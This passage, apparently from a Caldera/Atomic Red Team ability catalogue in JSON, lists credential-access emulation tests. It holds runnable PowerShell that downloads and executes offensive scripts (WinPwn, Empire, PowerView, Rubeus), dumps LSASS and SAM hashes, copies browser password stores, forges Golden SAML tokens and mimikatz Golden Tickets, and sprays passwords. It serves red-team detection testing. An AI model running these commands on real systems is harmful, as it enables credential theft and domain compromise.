                }
            }
        },
        "id__dependence__fact": [
            "60bb6f8468aa98b75be2521861a164d5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "60bb6f8468aa98b75be2521861a164d5"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__560688901ad2b8f465e98c52379ae834": {
        "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Remove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" > $null",
                    "command": "Copy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null; Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Copy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" > $null; cd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"; .\\BrowserCollector.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "560688901ad2b8f465e98c52379ae834",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "560688901ad2b8f465e98c52379ae834"
    },
    "T1003.002__credential-access__OS Credential Dumping: Security Account Manager__3bcfa369fd1f214e4d05944228eeb212": {
        "description": "Executes a hashdump by reading the hashes from the registry.",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.002",
            "name": "OS Credential Dumping: Security Account Manager"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\") { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null; Invoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"};  ;  Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green; Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"; Invoke-PowerDump",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3bcfa369fd1f214e4d05944228eeb212",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3bcfa369fd1f214e4d05944228eeb212"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__c6ea575d9641c11410417105f14175ab": {
        "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); kittenz -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c6ea575d9641c11410417105f14175ab",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c6ea575d9641c11410417105f14175ab"
    },
    "T1555.004__credential-access__Credentials from Password Stores: Windows Credential Manager__1353d954c020fa5ff039b7e85ee261bc": {
        "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.004",
            "name": "Credentials from Password Stores: Windows Credential Manager"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'); Invoke-WCMDump",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1353d954c020fa5ff039b7e85ee261bc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1353d954c020fa5ff039b7e85ee261bc"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__bbc786e45aff314d33e60133f010f00c": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp and  $env:TEMP\\results_<PID>.hlk.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore",
                    "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {;       $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\";   } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {;       $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\";   } else {;       $binary_path = \"File not found\";       exit 1;   }; $lsass_pid = get-process lsass |select -expand id; if (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} ; write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1; & $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1; Write-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bbc786e45aff314d33e60133f010f00c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bbc786e45aff314d33e60133f010f00c"
    },
    "T1606.002__credential-access__Forge Web Credentials: SAML token__502b7914aac58f15708500e3ec62526b": {
        "description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1606.002",
            "name": "Forge Web Credentials: SAML token"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "",
                    "command": "Import-Module AADInternals -Force; $saml = New-AADIntSAMLToken -ImmutableID \"aehgdqBTZV50DKQZmNJ8mg==\" -PfxFileName \".\\ADFS_signing.pfx\" -Issuer \"http://contoso.com/adfs/services/trust/\"; $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache; if ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }; Write-Host \"End of Golden SAML\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "502b7914aac58f15708500e3ec62526b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "502b7914aac58f15708500e3ec62526b"
    },
    "T1552.001__credential-access__Unsecured Credentials: Credentials In Files__58351281e64f2182ac4f8b44f63e9042": {
        "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.001",
            "name": "Unsecured Credentials: Credentials In Files"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Snaffler -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "58351281e64f2182ac4f8b44f63e9042",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "58351281e64f2182ac4f8b44f63e9042"
    },
    "T1003.002__credential-access__OS Credential Dumping: Security Account Manager__1ae855684c48448c29ad04858bbe5a2a": {
        "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.002",
            "name": "OS Credential Dumping: Security Account Manager"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); samfile -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1ae855684c48448c29ad04858bbe5a2a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1ae855684c48448c29ad04858bbe5a2a"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__36fc42ced381416ca7d5d7af0ee0561b": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -ErrorAction Ignore",
                    "command": "if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') { ; } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile C:\\Windows\\Temp\\xordump.exe};  ;  C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "36fc42ced381416ca7d5d7af0ee0561b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "36fc42ced381416ca7d5d7af0ee0561b"
    },
    "T1558.004__credential-access__Steal or Forge Kerberos Tickets: AS-REP Roasting__e0c75b4cc32124ef4c61508694fd0808": {
        "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.004",
            "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e0c75b4cc32124ef4c61508694fd0808",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e0c75b4cc32124ef4c61508694fd0808"
    },
    "T1110.003__credential-access__Brute Force: Password Spraying__c285cfeaf0c226d3d2b3812726dbe3a8": {
        "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c285cfeaf0c226d3d2b3812726dbe3a8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c285cfeaf0c226d3d2b3812726dbe3a8"
    },
    "T1558.003__credential-access__Steal or Forge Kerberos Tickets: Kerberoasting__8b5f748da9647a4d9c5a37f20124ba9c": {
        "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.003",
            "name": "Steal or Forge Kerberos Tickets: Kerberoasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing); Invoke-Kerberoast | fl",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8b5f748da9647a4d9c5a37f20124ba9c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8b5f748da9647a4d9c5a37f20124ba9c"
    },
    "T1110.001__credential-access__Brute Force: Password Guessing__4f277a5607b655a2e5bc05ff21ed81cf": {
        "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.001",
            "name": "Brute Force: Password Guessing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {;   Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\";   exit 1; }; [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389); $passwordList = Get-Content -Path \"5cb955_passwords.txt\"; foreach ($password in $passwordList){;   $credz = new-object System.Net.NetworkCredential(\"$ENV:USERNAME\", $password, \"$env:UserDnsDomain\");   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host \" [-] Attempting ${password} on account $ENV:USERNAME.\";     $conn.bind();     Write-Host \" [!] $ENV:USERNAME:${password} are valid credentials!\";   } catch {;     Write-Host $_.Exception.Message;   }; }; Write-Host \"End of bruteforce\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "5cb955_passwords.txt"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "4f277a5607b655a2e5bc05ff21ed81cf",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4f277a5607b655a2e5bc05ff21ed81cf"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__5610bf38f44ad2da2ecb846ba776ecdc": {
        "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$env:temp\\T1555.003Test8.txt\" -erroraction silentlycontinue",
                    "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"; cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py -d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt; cat $env:temp\\T1555.003Test8.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5610bf38f44ad2da2ecb846ba776ecdc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5610bf38f44ad2da2ecb846ba776ecdc"
    },
    "T1558.004__credential-access__Steal or Forge Kerberos Tickets: AS-REP Roasting__52928f462ea8f5fa617aa8c815f5598b": {
        "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.004",
            "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "52928f462ea8f5fa617aa8c815f5598b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "52928f462ea8f5fa617aa8c815f5598b"
    },
    "T1552.001__credential-access__Unsecured Credentials: Credentials In Files__2d2b2b31b70f1beef285b942c580f4c3": {
        "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.001",
            "name": "Unsecured Credentials: Credentials In Files"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); sensitivefiles -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2d2b2b31b70f1beef285b942c580f4c3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2d2b2b31b70f1beef285b942c580f4c3"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__e5279c9ad109fef655e2c1abd6304725": {
        "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -ErrorAction Ignore -Recurse",
                    "command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e5279c9ad109fef655e2c1abd6304725",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e5279c9ad109fef655e2c1abd6304725"
    },
    "T1110.001__credential-access__Brute Force: Password Guessing__3883fdbd7c29b2f2f20121c75f875944": {
        "description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.001",
            "name": "Brute Force: Password Guessing"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "",
                    "command": "Import-Module -Name AzureAD; $passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\"); foreach($password in $passwords) {;   $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force;   $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword;   try {;     Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\";     Connect-AzureAD -Credential $Credential 2>&1> $null;     Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\";     break;   } catch {;     Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\";   }; }; Write-Host \"End of bruteforce\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3883fdbd7c29b2f2f20121c75f875944",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3883fdbd7c29b2f2f20121c75f875944"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__1cca72410c2849070d833700fcc30c59": {
        "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore",
                    "command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1cca72410c2849070d833700fcc30c59",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1cca72410c2849070d833700fcc30c59"
    },
    "T1558.001__credential-access__Steal or Forge Kerberos Tickets: Golden Ticket__6d0695f8f33776c82ad1294b6c6f02cd": {
        "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.001",
            "name": "Steal or Forge Kerberos Tickets: Golden Ticket"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\" \"exit\";   echo.;   echo Requesting SYSVOL:;   dir \\\\%userdnsdomain%\\SYSVOL;   ;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of Golden Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6d0695f8f33776c82ad1294b6c6f02cd",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6d0695f8f33776c82ad1294b6c6f02cd"
    },
    "T1110.003__credential-access__Brute Force: Password Spraying__279d24eeb12b40e4547945accf59ca62": {
        "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
